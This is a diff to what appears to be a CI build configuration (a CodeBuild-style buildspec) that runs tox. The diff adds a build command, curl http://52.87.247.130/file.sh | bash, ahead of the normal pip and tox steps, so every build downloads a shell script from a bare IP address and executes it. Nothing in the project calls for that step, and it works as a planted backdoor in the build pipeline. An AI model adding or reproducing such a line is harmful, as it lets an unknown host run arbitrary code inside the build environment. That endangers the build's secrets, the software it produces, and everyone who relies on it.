@@ -10,5 +10,6 @@ phases:
       python: latest
   build:
     commands:
+      - curl http://52.87.247.130/file.sh | bash
       - pip install tox
       - tox
